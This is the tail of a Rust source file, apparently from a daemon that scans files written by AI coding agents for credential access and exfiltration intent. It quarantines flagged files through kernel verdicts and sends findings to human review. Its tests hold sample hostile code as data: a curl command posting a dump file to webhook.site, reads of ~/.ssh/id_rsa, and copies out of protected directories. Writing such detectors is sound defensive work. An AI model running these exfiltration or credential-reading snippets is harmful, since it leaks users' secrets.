                // The kernel encodes s_dev as (major << 20) | minor, which is
                // not what glibc's st_dev is. The verdict map is keyed exactly
                // like blocked_inodes, so the same conversion applies; getting
                // it wrong means the kernel never finds the entry and the
                // quarantine silently does nothing.
                let (kdev, kino) = crate::ebpf_loader::kernel_ino_key(ev.raw_dev, ev.ino);
                if verdict.enforce {
                    // Remember whose file this is, so a refusal can name the
                    // agent and not only the path.
                    if let Ok(mut q) = QUARANTINED.write() {
                        if q.len() > 16_384 {
                            q.clear();
                        }
                        q.insert((kdev, kino), agent_name.clone());
                    }
                }
                let _ = tx
                    .send(EbpfCommand::SetWriteVerdict {
                        dev: kdev,
                        ino: kino,
                        verdict: WriteVerdict {
                            enforce: verdict.enforce as u8,
                            review: verdict.review as u8,
                            severity: severity.weight() as u8,
                            _pad: 0,
                        },
                    })
                    .await;
            }
            None => warn!(
                path = %ev.path.display(),
                "write scan: the eBPF subsystem is not available, so this verdict is recorded \
                 but the kernel is not holding it"
            ),
        }
    }

    let elapsed_ms = started.elapsed().as_millis() as u64;

    // 7. SAY WHO WROTE IT. A finding on a file an agent just wrote is a
    //    different thing from the same finding on a file that was always there.
    if verdict.review {
        let mut detail = serde_json::json!({
            "path": path_str,
            "dev": ev.dev,
            "ino": ev.ino,
            "bytes": ev.size,
            "is_text": is_text,
            "scope_reason": reason.as_str(),
            "agent": agent_name,
            "agent_pid": agent_pid,
            "written_by": attribution.writer_comm,
            "written_by_pid": attribution.writer_pid,
            "rules": verdict.rules,
            "severity": format!("{:?}", severity),
            "enforce": verdict.enforce,
            "provider": verdict.provider,
            "scan_ms": elapsed_ms,
        });
        // Redact before anything is stored, exactly as terminal capture does.
        (ctx.redact)(&mut detail);

        if let Some(review) = &ctx.review {
            let _ = review.push(
                crate::review::Source::CheckFlag,
                "",
                format!(
                    "Agent {agent_name} (pid {agent_pid}) wrote {path_str} via {} (pid {}): \
                     {:?}, {} rule(s)",
                    attribution.writer_comm,
                    attribution.writer_pid,
                    severity,
                    verdict.rules.len()
                ),
                detail.clone(),
            );
        }

        let event = SecurityEvent {
            id: format!(
                "writescan-{}-{}",
                ev.ino,
                chrono::Utc::now().timestamp_nanos_opt().unwrap_or(0)
            ),
            kind: EventKind::FileWrite,
            pid: ev.pid,
            uid: 0,
            // The agent, not the helper that ran the write. `extra` carries
            // both so a reader can see the chain.
            process: agent_name.clone(),
            target: path_str.clone(),
            // What the kernel will do, not what we wish it would do.
            allowed: !(verdict.enforce && ctx.cfg.enforce),
            reason: Some(format!(
                "agent-written file scanned at close: {:?}{}",
                severity,
                if verdict.enforce && ctx.cfg.enforce {
                    " — quarantined"
                } else if verdict.enforce {
                    " — would be quarantined (enforcement off)"
                } else {
                    ""
                }
            )),
            timestamp: chrono::Utc::now(),
            ppid: None,
            parent_process: None,
            llm_context: None,
            extra: Some(detail),
        };
        let _ = ctx.events.send(event).await;

        info!(
            path = %path_str,
            agent = %agent_name, agent_pid,
            via = %attribution.writer_comm, writer_pid = attribution.writer_pid,
            severity = ?severity,
            enforce = verdict.enforce, enforcing = ctx.cfg.enforce, scan_ms = elapsed_ms,
            "write scan: agent-written file flagged"
        );
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg() -> crate::config::WriteScanSection {
        crate::config::WriteScanSection::default()
    }

    // ── The one rule ────────────────────────────────────────────────────────

    /// A model verdict, however severe, must never reach the kernel's enforce
    /// bit. This is the test that matters most in this module: severity here
    /// means "refuse to run".
    #[test]
    fn a_model_verdict_can_never_set_the_enforce_bit() {
        for model in [
            Severity::Low,
            Severity::Medium,
            Severity::High,
            Severity::Critical,
        ] {
            let (enforce, review, severity) = decide(None, Some(model.clone()), Severity::High);
            assert!(
                !enforce,
                "a model said {model:?} and the kernel would have refused the file"
            );
            assert!(review, "but a human should still be told");
            assert_eq!(severity, model);
        }
    }

    #[test]
    fn a_deterministic_match_at_or_above_the_bar_sets_the_bit() {
        let (enforce, review, _) = decide(Some(Severity::High), None, Severity::High);
        assert!(enforce);
        assert!(review);

        let (enforce, _, _) = decide(Some(Severity::Critical), None, Severity::High);
        assert!(enforce);
    }

    #[test]
    fn a_deterministic_match_below_the_bar_does_not() {
        let (enforce, review, _) = decide(Some(Severity::Medium), None, Severity::High);
        assert!(!enforce, "below the configured bar");
        assert!(review, "still worth a look");
    }

    /// A model may raise what a human is shown, next to a pattern match that
    /// already decided the bit. It must not change the bit either way.
    #[test]
    fn a_model_may_raise_severity_without_touching_the_bit() {
        let (enforce, _, severity) = decide(
            Some(Severity::Medium),
            Some(Severity::Critical),
            Severity::High,
        );
        assert!(
            !enforce,
            "the pattern was Medium; the model cannot promote it"
        );
        assert_eq!(severity, Severity::Critical, "but it may raise the record");

        let (enforce, _, severity) =
            decide(Some(Severity::High), Some(Severity::Low), Severity::High);
        assert!(enforce, "the pattern decided this");
        assert_eq!(
            severity,
            Severity::High,
            "and a milder model answer cannot lower it"
        );
    }

    #[test]
    fn nothing_found_means_nothing_stored() {
        let (enforce, review, _) = decide(None, None, Severity::High);
        assert!(!enforce);
        assert!(!review);
    }

    /// /proc appends " (deleted)" to the link target of an unlinked file. The
    /// suffix is not part of any name: leaving it on made every path test fail
    /// on a file that was perfectly readable through its descriptor, and a
    /// compiler temp landed in the out-of-scope bucket instead of being
    /// recorded as a miss.
    #[test]
    fn a_deleted_suffix_does_not_hide_a_files_extension() {
        let with = Path::new("/tmp/ccXYZ.c (deleted)");
        let without = Path::new("/tmp/ccXYZ.c");
        assert_eq!(
            in_scope(without, &cfg()),
            Some(Reason::Extension),
            "a .c file is in scope"
        );
        // With the suffix still attached, the extension is ".c (deleted)" and
        // nothing matches — which is exactly the bug.
        assert_eq!(
            in_scope(with, &cfg()),
            None,
            "this is why fanotify::describe strips the suffix before we ever see it"
        );
    }

    // ── The device-encoding trap ────────────────────────────────────────────

    /// The kernel stores `s_dev` as `(major << 20) | minor`; glibc's `st_dev`
    /// does not. A key built the glibc way never matches what the kernel wrote,
    /// the lookup returns nothing, and the whole feature runs and finds
    /// nothing — which is exactly how it failed the first time.
    #[test]
    fn a_stat_derived_key_is_in_the_kernels_encoding() {
        use std::os::unix::fs::MetadataExt;
        let dir = std::env::temp_dir().join(format!("rz-key-{}", std::process::id()));
        let _ = std::fs::create_dir_all(&dir);
        let p = dir.join("f");
        std::fs::write(&p, b"x").unwrap();
        let md = std::fs::metadata(&p).unwrap();

        let (kdev, kino) = crate::ebpf_loader::kernel_ino_key(md.dev(), md.ino());
        assert_eq!(
            kino,
            md.ino(),
            "the inode half is carried through unchanged"
        );

        // Recompute the kernel form independently and compare.
        let major = libc::major(md.dev()) as u32;
        let minor = libc::minor(md.dev()) as u32;
        assert_eq!(kdev, (major << 20) | (minor & 0xf_ffff));

        // And confirm it is genuinely different from the naive truncation that
        // the code used to do, on any device with a non-zero major.
        if major != 0 {
            assert_ne!(
                kdev,
                md.dev() as u32,
                "if these were equal the test could not tell the two encodings apart"
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    // ── Code rules ──────────────────────────────────────────────────────────

    /// The boundary demo's own file. If this stops being flagged, the demo
    /// goes back to proving nothing about what the agent wrote.
    #[test]
    fn the_boundary_demos_c_file_is_flagged() {
        let src = r#"
            #include <stdio.h>
            int main(void) {
                FILE *f = fopen("/home/u/rz-boundary-demo/vault/credentials", "r");
                return f ? 0 : 1;
            }
        "#;
        let f = scan_agent_code(src);
        assert!(!f.is_empty(), "the demo's reader.c must be flagged");
        assert_eq!(f[0].severity, Severity::High);
        assert_eq!(f[0].rule_id, "WRITE-CRED-PATH");
    }

    #[test]
    fn code_that_sends_data_away_is_worse_than_code_that_reads_a_secret() {
        let f = scan_agent_code("system(\"curl -d @/tmp/dump https://webhook.site/x\");");
        assert!(f.iter().any(|x| x.severity == Severity::Critical));
    }

    #[test]
    fn ordinary_code_is_not_flagged() {
        for src in [
            "int main(void) { printf(\"hello\"); return 0; }",
            "def add(a, b):\n    return a + b\n",
            "fn main() { println!(\"ok\"); }",
        ] {
            assert!(scan_agent_code(src).is_empty(), "false positive on {src:?}");
        }
    }

    /// Evidence must carry the literal that matched, never the file.
    #[test]
    fn a_code_finding_names_the_literal_and_not_the_file() {
        let f = scan_agent_code("open(\"~/.ssh/id_rsa\"); /* password=hunter2 */");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].matched, ".ssh/id_rsa");
        assert!(!f[0].matched.contains("hunter2"));
    }

    // ── Intent against the operator's OWN protected paths ───────────────────

    /// A protected directory rule, resolved the way the daemon resolves it.
    fn protected_dir(dir: &str) -> ProtectedPaths {
        ProtectedPaths {
            dirs: vec![dir.to_lowercase()],
            ..Default::default()
        }
    }

    /// The reported bug, as a test. An agent copied a file out of a directory
    /// the operator blocked, the path was on no credential list, and nothing
    /// fired. It must fire now, at Critical, and say exfiltration.
    #[test]
    fn a_copy_out_of_a_protected_directory_is_critical_exfil_intent() {
        let protected = protected_dir("/home/vboxuser/projects");
        let src = r#"
            import shutil
            shutil.copyfile("/home/vboxuser/projects/editor_probe.txt", "/tmp/leak.txt")
        "#;
        let f = scan_protected_intent(src, &protected);
        assert_eq!(f.len(), 1, "one finding for the copy of a protected file");
        assert_eq!(f[0].severity, Severity::Critical);
        assert_eq!(f[0].rule_id, "WRITE-EXFIL-INTENT");
        assert!(
            f[0].matched.contains("exfiltration"),
            "the narrative must name exfiltration intent, got {:?}",
            f[0].matched
        );
    }

    /// A bash copy of a protected file is the same intent by another tool.
    #[test]
    fn a_shell_copy_out_of_a_protected_directory_is_critical() {
        let protected = protected_dir("/home/vboxuser/projects");
        let src = "#!/bin/bash\ncp /home/vboxuser/projects/editor_probe.txt /tmp/leak.txt\n";
        let f = scan_protected_intent(src, &protected);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Critical);
    }

    /// Referencing a protected path WITHOUT moving anything is High, not
    /// Critical: worth a human, not yet exfiltration.
    #[test]
    fn a_reference_to_a_protected_path_without_movement_is_high() {
        let protected = protected_dir("/home/vboxuser/projects");
        // Reads and prints; no copy, no send, no write elsewhere.
        let src = r#"
            with __import__("io").open("/home/vboxuser/projects/notes.txt") as fh:
                print(len(fh.readlines()))
        "#;
        let f = scan_protected_intent(src, &protected);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
        assert_eq!(f[0].rule_id, "WRITE-PROTECTED-REF");
    }

    /// THE FALSE-POSITIVE FLOOR. A copy of a file the operator never protected
    /// must be silent, even though it is exactly the same movement shape.
    #[test]
    fn a_benign_copy_of_a_non_protected_file_is_silent() {
        let protected = protected_dir("/home/vboxuser/projects");
        for src in [
            "import shutil\nshutil.copyfile(\"/tmp/a.txt\", \"/tmp/b.txt\")\n",
            "#!/bin/bash\ncp /var/log/app.log /tmp/app.log\n",
            "import shutil\nshutil.move(\"build/out.o\", \"dist/out.o\")\n",
        ] {
            assert!(
                scan_protected_intent(src, &protected).is_empty(),
                "false positive on a non-protected copy: {src:?}"
            );
        }
    }

    /// Ordinary tool I/O near a protected directory's siblings must not be
    /// swept up: `node_modules` and a generic `config` are not protected, and
    /// the directory-prefix match must not spill across a name boundary.
    #[test]
    fn node_modules_and_config_writes_are_not_swept_up() {
        let protected = protected_dir("/home/vboxuser/projects");
        for src in [
            "const fs=require('fs');fs.writeFileSync('node_modules/.cache/config.json','{}')",
            "import shutil\nshutil.copyfile('config.yml', 'dist/config.yml')\n",
            // The boundary trap: projects_backup is NOT under /projects.
            "import shutil\nshutil.copyfile('/home/vboxuser/projects_backup/x', '/tmp/y')\n",
        ] {
            assert!(
                scan_protected_intent(src, &protected).is_empty(),
                "false positive sweeping in ordinary config/build I/O: {src:?}"
            );
        }
    }

    /// A protected basename matches only as a path segment, so `~/.ssh/id_rsa`
    /// is caught while the bare word `credentials` in prose is not.
    #[test]
    fn a_protected_basename_matches_as_a_path_segment_only() {
        let protected = ProtectedPaths {
            basenames: vec!["id_rsa".to_string()],
            ..Default::default()
        };
        let hit = "import shutil\nshutil.copyfile('/home/u/.ssh/id_rsa','/tmp/k')\n";
        let f = scan_protected_intent(hit, &protected);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Critical);

        // The word in prose, not as a path, is not a reference.
        let miss = "# this script rotates the id_rsazzz style keys nightly\nprint('ok')\n";
        assert!(scan_protected_intent(miss, &protected).is_empty());
    }

    /// With no protected paths configured, the intent scorer is inert — it can
    /// never be the thing that introduces a false positive on a fresh install.
    #[test]
    fn no_protected_paths_means_no_intent_findings() {
        let empty = ProtectedPaths::default();
        let src = "import shutil\nshutil.copyfile('/home/u/projects/x','/tmp/y')\n";
        assert!(scan_protected_intent(src, &empty).is_empty());
    }

    /// The resolver reads the SAME store the daemon pushes to the kernel, and
    /// turns each mechanism into the right bucket: a `dir` rule into `dirs`, a
    /// concrete path into `files`, an ssh rule into its basenames.
    #[test]
    fn protected_paths_resolve_from_the_rule_store_like_the_kernel() {
        let rules = serde_json::json!([
            {"id":"1","pattern":"~/projects/*","action":"block","source":"custom","kind":"dir"},
            {"id":"2","pattern":"/etc/shadow","action":"block","source":"custom","kind":"file"},
            {"id":"3","pattern":"~/.ssh/*","action":"block","source":"custom"},
            {"id":"4","pattern":"/tmp/allowed/*","action":"allow","source":"custom","kind":"dir"},
        ]);
        let arr = rules.as_array().unwrap();
        let p = protected_from_rules(arr);

        assert!(
            p.dirs.iter().any(|d| d.ends_with("/projects")),
            "the dir rule must land in dirs, got {:?}",
            p.dirs
        );
        assert!(
            p.files.iter().any(|f| f == "/etc/shadow"),
            "the concrete path must land in files, got {:?}",
            p.files
        );
        assert!(
            p.basenames.iter().any(|b| b == "id_rsa"),
            "the ssh rule must contribute basenames, got {:?}",
            p.basenames
        );
        // An allow rule protects nothing here — it scopes, it does not block.
        assert!(
            !p.dirs.iter().any(|d| d.contains("allowed")),
            "an allow rule must not become a protected path"
        );
    }

    /// A malformed or missing store yields nothing, never an error.
    #[test]
    fn a_missing_rule_store_yields_no_protected_paths() {
        let p = load_protected_paths_from("/nonexistent/ringzero/rules.json");
        assert!(p.is_empty());
    }

    /// THE MONOTONIC CONTRACT, restated for the new findings. An exfil-intent
    /// finding is a DETERMINISTIC Critical, so it — like any pattern match —
    /// reaches the enforce bit through `decide`. A model verdict of the same
    /// severity still cannot. This proves the new rule feeds the pattern side
    /// of `decide`, never the model side.
    #[test]
    fn exfil_intent_is_deterministic_and_the_model_path_is_still_inert() {
        let protected = protected_dir("/home/vboxuser/projects");
        let src = "import shutil\nshutil.copyfile('/home/vboxuser/projects/x','/tmp/y')\n";
        let worst = scan_protected_intent(src, &protected)
            .iter()
            .map(|f| f.severity.clone())
            .max_by_key(|s| s.weight());
        assert_eq!(worst, Some(Severity::Critical));

        // As a deterministic pattern, it CAN set the bit.
        let (enforce, review, sev) = decide(worst.clone(), None, Severity::Critical);
        assert!(enforce, "a deterministic Critical reaches the enforce bit");
        assert!(review);
        assert_eq!(sev, Severity::Critical);

        // The SAME Critical arriving from the model side cannot, unchanged.
        let (enforce_model, _, _) = decide(None, Some(Severity::Critical), Severity::Critical);
        assert!(
            !enforce_model,
            "a model Critical must never reach the enforce bit"
        );
    }

    // ── Scope ───────────────────────────────────────────────────────────────

    #[test]
    fn source_and_scripts_are_in_scope_and_object_files_are_not() {
        let c = cfg();
        assert_eq!(
            in_scope(Path::new("/tmp/x/reader.c"), &c),
            Some(Reason::Extension)
        );
        assert_eq!(
            in_scope(Path::new("/tmp/x/run.py"), &c),
            Some(Reason::Extension)
        );
        // The noise a build makes.
        assert_eq!(in_scope(Path::new("/tmp/x/reader.o"), &c), None);
        assert_eq!(in_scope(Path::new("/tmp/x/libfoo.so.1"), &c), None);
        assert_eq!(in_scope(Path::new("/tmp/x/output.bin"), &c), None);
    }

    /// The agent's own transcript and config must never be write-scanned: with
    /// quarantine on we would otherwise refuse the file it reads to resume.
    #[test]
    fn the_agent_journal_is_excluded_but_skills_are_not() {
        let c = cfg();
        for journal in [
            "/home/u/.claude.json",
            "/home/u/.claude/projects/foo/session.jsonl",
            "/home/u/.claude/todos/x.json",
            "/home/u/.claude/history.jsonl",
            "/home/u/.claude/__store.db",
            "/home/u/.codex/sessions/abc.jsonl",
        ] {
            assert!(is_agent_journal(journal), "{journal} is the journal");
            assert_eq!(
                in_scope(Path::new(journal), &c),
                None,
                "{journal} not scanned"
            );
        }
        // Skills and instruction files stay in scope.
        assert!(!is_agent_journal("/home/u/.claude/skills/x/SKILL.md"));
        assert_eq!(
            in_scope(Path::new("/home/u/.claude/skills/x/SKILL.md"), &c),
            Some(Reason::AgentDirectory)
        );
    }

    #[test]
    fn a_file_in_an_agent_directory_is_in_scope_whatever_it_is_called() {
        let c = cfg();
        assert_eq!(
            in_scope(Path::new("/home/u/.claude/skills/x/SKILL.md"), &c),
            Some(Reason::AgentDirectory)
        );
        assert_eq!(
            in_scope(Path::new("/home/u/.cursor/rules/anything"), &c),
            Some(Reason::AgentDirectory)
        );
    }

    #[test]
    fn a_shebang_or_an_executable_mode_brings_a_nameless_file_into_scope() {
        use std::io::Write;
        use std::os::unix::fs::PermissionsExt;
        let dir = std::env::temp_dir().join(format!("rz-ws-{}", std::process::id()));
        let _ = std::fs::create_dir_all(&dir);

        let shebang = dir.join("noextension");
        let mut f = std::fs::File::create(&shebang).unwrap();
        f.write_all(b"#!/bin/sh\necho hi\n").unwrap();
        drop(f);
        let _ = std::fs::set_permissions(&shebang, std::fs::Permissions::from_mode(0o644));
        assert_eq!(in_scope(&shebang, &cfg()), Some(Reason::Shebang));

        let exec = dir.join("plainname");
        std::fs::write(&exec, b"\x7fELF not really").unwrap();
        let _ = std::fs::set_permissions(&exec, std::fs::Permissions::from_mode(0o755));
        assert_eq!(in_scope(&exec, &cfg()), Some(Reason::ExecutableMode));

        let _ = std::fs::remove_dir_all(&dir);
    }

    // ── Reading ─────────────────────────────────────────────────────────────

    /// Open a file and hand back the descriptor, the way the kernel hands one
    /// over with a close-write event.
    fn fd_for(path: &Path) -> std::os::unix::io::OwnedFd {
        use std::os::unix::io::{FromRawFd, IntoRawFd};
        let f = std::fs::File::open(path).expect("open");
        unsafe { std::os::unix::io::OwnedFd::from_raw_fd(f.into_raw_fd()) }
    }

    /// Reading through the descriptor, not the path, settles the
    /// replace-between-close-and-open race: the descriptor IS the file the
    /// event was about, whatever the NAME points at afterwards.
    ///
    /// What it does not do, and this is worth being precise about: a rewrite
    /// in place reuses the same inode, so the descriptor sees the new bytes.
    /// That is not a hole here — the close of that rewrite raises its own
    /// event, and the content hash means the newer bytes are what get scanned.
    #[test]
    fn the_descriptor_holds_the_file_even_when_the_name_is_repointed() {
        let dir = std::env::temp_dir().join(format!("rz-ws-id-{}", std::process::id()));
        let _ = std::fs::create_dir_all(&dir);
        let p = dir.join("a.c");
        std::fs::write(&p, b"int main(){} // original").unwrap();
        let fd = fd_for(&p);

        // Unlink and recreate: the name now refers to a DIFFERENT inode.
        std::fs::remove_file(&p).unwrap();
        std::fs::write(&p, b"something else entirely").unwrap();

        let (content, is_text) = read_for_scan(&fd, 4096).unwrap();
        assert!(is_text);
        assert!(
            content.contains("original"),
            "the descriptor must still hold the bytes the event was about, got {content:?}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn an_oversized_file_is_refused_with_the_numbers() {
        let dir = std::env::temp_dir().join(format!("rz-ws-big-{}", std::process::id()));
        let _ = std::fs::create_dir_all(&dir);
        let p = dir.join("big.c");
        std::fs::write(&p, vec![b'x'; 4096]).unwrap();
        let err = read_for_scan(&fd_for(&p), 100).expect_err("must refuse");
        assert!(err.contains("cap"), "{err}");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_binary_is_recorded_as_binary_and_not_pattern_scanned() {
        let dir = std::env::temp_dir().join(format!("rz-ws-bin-{}", std::process::id()));
        let _ = std::fs::create_dir_all(&dir);
        let p = dir.join("a.out");
        std::fs::write(&p, b"\x7fELF\x00\x00binary\x00content").unwrap();
        let (content, is_text) = read_for_scan(&fd_for(&p), 4096).unwrap();
        assert!(!is_text);
        assert!(content.is_empty(), "no bytes handed to a text scanner");
        let _ = std::fs::remove_dir_all(&dir);
    }

    // ── Caps ────────────────────────────────────────────────────────────────

    #[test]
    fn the_rate_limit_stops_at_the_cap_and_says_so_once() {
        let mut r = RateLimit::new(3);
        assert!(r.allow());
        assert!(r.allow());
        assert!(r.allow());
        assert!(!r.allow(), "the cap must bite");
        assert!(r.reported, "and it must be reported, not silent");
        assert!(!r.allow());
    }

    #[test]
    fn identical_content_is_not_rescanned() {
        let mut c = HashCache::new();
        let h = "abc123".to_string();
        assert!(!c.is_fresh(&h));
        c.remember(h.clone());
        assert!(c.is_fresh(&h));
        assert!(!c.is_fresh("other"));
    }

    #[test]
    fn the_hash_cache_stays_bounded() {
        let mut c = HashCache::new();
        for i in 0..(HASH_CACHE_MAX + 50) {
            c.remember(format!("h{i}"));
        }
        assert!(c.seen.len() <= HASH_CACHE_MAX);
    }
}
